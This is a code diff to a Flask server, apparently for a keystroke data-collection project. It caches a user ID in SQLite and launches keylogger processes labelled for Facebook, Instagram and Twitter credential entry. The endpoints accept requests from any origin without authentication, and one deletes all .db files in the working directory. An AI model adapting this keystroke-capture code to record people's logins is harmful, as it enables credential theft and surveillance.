@@ -1,6 +1,8 @@
+import os
+import glob
 import multiprocessing
+import sqlite3
 import sys
-from dotenv import dotenv_values
 from flask import Flask, jsonify, request
 from flask_cors import CORS
 from tools.keylogger import Keylogger
@@ -11,33 +13,78 @@ from base.log import Logger
 keylogger_process = {}
 
 
-def execute_keylogger(platform_id: str):
-    """Start recording keystrokes for the given platform in a separate process."""
-    keylogger_instance = Keylogger(user_id)
+def build_user_id_cache_table(user_id: str):
+    conn = sqlite3.connect("user_id_cache.db")
+    cursor = conn.cursor()
+    cursor.execute("""
+    CREATE TABLE IF NOT EXISTS user (
+        id INTEGER PRIMARY KEY,
+        keylogger_id TEXT UNIQUE
+    );
+""")
+    # Check if there's already a row in the table
+    cursor.execute("SELECT COUNT(*) FROM user")
+    row_count = cursor.fetchone()[0]
 
+    if row_count == 0:
+        # Insert a new row if the table is empty
+        cursor.execute(
+            """
+        INSERT INTO user (keylogger_id) 
+        VALUES (?);
+        """,
+            (user_id,),
+        )
+        conn.commit()
+        print("Inserted new row.")
+    else:
+        print("Table already has a row. No insertion.")
+
+    conn.close()
+
+
+def get_user_id_from_cache():
+    conn = sqlite3.connect("user_id_cache.db")
+    cursor = conn.cursor()
+    cursor.execute("""
+    CREATE TABLE IF NOT EXISTS user (
+        id INTEGER PRIMARY KEY,
+        keylogger_id TEXT UNIQUE
+    );
+""")
+
+    cursor.execute("SELECT * FROM user")
+    row = cursor.fetchone()  # Since there's only one row, we can use fetchone()
+
+    if row:
+        print(row)
+    else:
+        raise ValueError("user ID cache is empty!")
+    conn.close()
+    return str(row[1])
+
+
+def execute_keylogger(platform_id: str, user_id: str):
+    """Start recording keystrokes for the given platform in a separate process."""
+    print("ID passed to the keylogger" + user_id)
+    keylogger_instance = Keylogger(user_id)
+    account_number = 1
     if platform_id == "0":
         keylogger_instance.start_recording(
-            CredentialType.FACEBOOK, int(user_id), running_through_flask=True
+            CredentialType.FACEBOOK, int(account_number), running_through_flask=True
         )
     elif platform_id == "1":
         keylogger_instance.start_recording(
-            CredentialType.INSTAGRAM, int(user_id), running_through_flask=True
+            CredentialType.INSTAGRAM, int(account_number), running_through_flask=True
         )
     elif platform_id == "2":
         keylogger_instance.start_recording(
-            CredentialType.TWITTER, int(user_id), running_through_flask=True
+            CredentialType.TWITTER, int(account_number), running_through_flask=True
         )
 
 
-config = dotenv_values(".env")
-user_id = config.get("FP_USER_ID")
-if user_id is None:
-    log = Logger()
-    log.km_error("No FP_USER_ID environment variable set")
-    sys.exit(1)
-
-print("Loaded user id is:", user_id)
-
+# TODO: Another approach that might work is if the js stores the id in a cookie and sends it when hitting 
+#       the start-server endpoint, that way the flask server can just grab it from the response data
 app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}}, allow_headers=["Content-Type"])
 
@@ -51,6 +98,19 @@ def handle_preflight():
         response.headers.add("Access-Control-Allow-Methods", "POST, OPTIONS")
         response.headers.add("Access-Control-Allow-Headers", "Content-Type")
         return response
+
+
+@app.route("/set-id", methods=["POST"])
+def set_cookie():
+    data = request.get_json()
+    user_id = str(data.get("user_id"))
+    log = Logger()
+    if user_id is None:
+        log.km_error("No USER_ID cookie set")
+        sys.exit(1)
+    log.km_info(f"Loaded user id is: {user_id}")
+    build_user_id_cache_table(user_id)
+    return jsonify({"message": "Keylogger user_id set"}), 200
 
 
 @app.route("/start-server", methods=["POST"])
@@ -69,9 +129,16 @@ def start_server():
         keylogger_process[
             "keylogger"
         ].join()  # Ensure the process has completely stopped
-
+    # Grab the uer_id from the sqlite cache which should be set on page load (so it should be there when this endpoint is hit)
+    user_id = get_user_id_from_cache()
     # Start a new keylogger process
-    p1 = multiprocessing.Process(target=execute_keylogger, args=(platform_id,))
+    p1 = multiprocessing.Process(
+        target=execute_keylogger,
+        args=(
+            platform_id,
+            user_id,
+        ),
+    )
     p1.start()
 
     keylogger_process["keylogger"] = p1  # Store process reference
@@ -95,6 +162,22 @@ def end_server():
         return jsonify({"message": "Keylogger process terminated"}), 200
     else:
         return jsonify({"message": "No keylogger process found"}), 400
+
+
+@app.route("/end-collection", methods=["GET"])
+def on_completion():
+    db_files = glob.glob(os.path.join(os.getcwd(), "*.db"))
+    for db_file in db_files:
+        try:
+            os.remove(db_file)
+            print(f"Deleted: {db_file}")
+        except Exception as e:
+            print(f"Error deleting {db_file}: {e}")
+            response = {"message": "Failed to delete db!", "status": "fail"}
+            return jsonify(response)
+
+    response = {"message": "Deleted db file!", "status": "success"}
+    return jsonify(response)
 
 
 if __name__ == "__main__":
